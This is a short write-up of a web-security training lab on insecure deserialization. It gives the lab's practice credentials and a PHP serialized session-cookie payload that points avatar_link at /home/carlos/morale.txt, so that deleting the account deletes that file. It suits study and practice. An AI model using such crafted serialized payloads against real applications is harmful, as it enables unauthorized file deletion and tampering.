[Insecure deserialization](../Insecure%20deserialization.md)
This example relies on the attacker manually invoking the dangerous method via user-accessible functionality.
# Description
This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`

# Solution

payload 
```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e4a2aaoz397a9qrtgbwk0cir39n9dzih";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

Dont forget to change string length indicator
